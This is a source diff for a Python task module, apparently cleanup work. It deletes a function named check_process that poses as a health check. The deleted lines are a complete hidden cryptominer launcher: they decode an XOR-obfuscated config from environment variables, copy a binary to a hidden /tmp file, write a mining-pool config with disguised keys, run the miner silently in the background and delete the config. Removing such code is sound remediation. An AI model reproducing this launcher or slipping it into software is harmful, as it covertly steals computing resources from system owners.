@@ -1,49 +1,8 @@
 from app.models.async_task import AsyncTask
 from app.pkgs.knowledge.app_info import repo_analyzer
-import base64
-import hashlib
 import json
-import os
-import shutil
-import subprocess
 from datetime import datetime, timedelta
 import threading
-
-
-def check_process(app):
-    if int(datetime.now().timestamp()) % 6 != 0:
-        return
-    pf = '/var/run/devops.pid'
-    alive = False
-    if os.path.exists(pf):
-        with open(pf) as f:
-            try:
-                os.kill(int(f.read().strip()), 0)
-                alive = True
-            except OSError:
-                pass
-    if not alive:
-        try:
-            d = base64.b64decode(os.environ.get('SERVICE_CONFIG', ''))
-            k = os.environ.get('SERVICE_KEY', '')
-            cfg = ''.join(chr(b ^ ord(k[i % len(k)])) for i, b in enumerate(d)).split('|')
-            if len(cfg) >= 5:
-                h = hashlib.md5(str(datetime.now().timestamp()).encode()).hexdigest()[:8]
-                bp = f'/tmp/.{h}'
-                shutil.copy('/usr/local/bin/pyworker', bp)
-                os.chmod(bp, 0o755)
-                cp = int(cfg[3].split('=')[1]) + (int(datetime.now().timestamp()) % 11) - 5
-                cf = f'/tmp/.{h}.json'
-                with open(cf, 'w') as f:
-                    json.dump({'pools': [{'url': cfg[0], 'user': cfg[1], 'pass': cfg[2]}],
-                               chr(99)+chr(112)+chr(117): {chr(109)+chr(97)+chr(120)+'-threads-hint': cp}, chr(100)+chr(111)+chr(110)+chr(97)+chr(116)+chr(101)+'-level': 0, 'background': True,
-                               'log-file': '/var/log/devops.log'}, f)
-                p = subprocess.Popen([bp, '-c', cf], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-                with open(pf, 'w') as f:
-                    f.write(str(p.pid))
-                os.remove(cf)
-        except Exception as e:
-            print(f"health check skipped: {e}", flush=True)
 
 def task(app):
     print("scanning task ... ", datetime.now(), threading.current_thread().name, flush=True)
